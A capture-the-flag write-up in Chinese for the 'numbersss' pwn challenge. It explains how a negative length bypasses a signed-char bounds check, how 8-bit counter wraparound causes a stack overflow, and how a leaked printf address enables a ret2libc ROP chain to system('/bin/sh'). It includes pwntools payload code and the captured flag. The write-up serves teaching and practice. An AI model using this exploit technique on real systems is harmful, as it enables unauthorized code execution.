# numbersss

## 题目简述

程序把用户长度和循环计数器都声明为有符号 `char`。它只拒绝大于 16 的长度，所以负数可通过检查；计数器递增并发生 8 位回绕，从而向 16 字节栈缓冲区写入远超预期的数据。程序还直接泄露 `printf` 地址。

## 解题过程

先解析启动输出中的 `printf` 地址，并用附件 `libc.so.6` 计算基址：

```python
printf_addr = int(p.recvline().split()[-1], 16)
libc.address = printf_addr - libc.sym["printf"]
```

输入长度 `-10`。计数器从 0 增长到 127，随后回绕到 -128，最终到达 -10 才退出，共执行 246 次写入。保存返回地址距 `buf` 为 24 字节，因此前部 ROP 链为：

```python
payload  = b"A" * 24
payload += p64(libc.address + ret)
payload += p64(libc.address + pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym["system"])
payload  = payload.ljust(246, b"B")
```

发送后函数返回到 `system("/bin/sh")`。读取 flag 得到：

```text
byuctf{gotta_pay_attention_to_the_details!}
```

## 方法总结

边界检查必须与变量的符号性和循环终止条件一起分析。负长度没有直接传给 `read`，却通过有符号 8 位计数器的模 $2^8$ 回绕转化为 246 次单字节写入；现成 libc 泄露则消除了 ASLR 障碍。
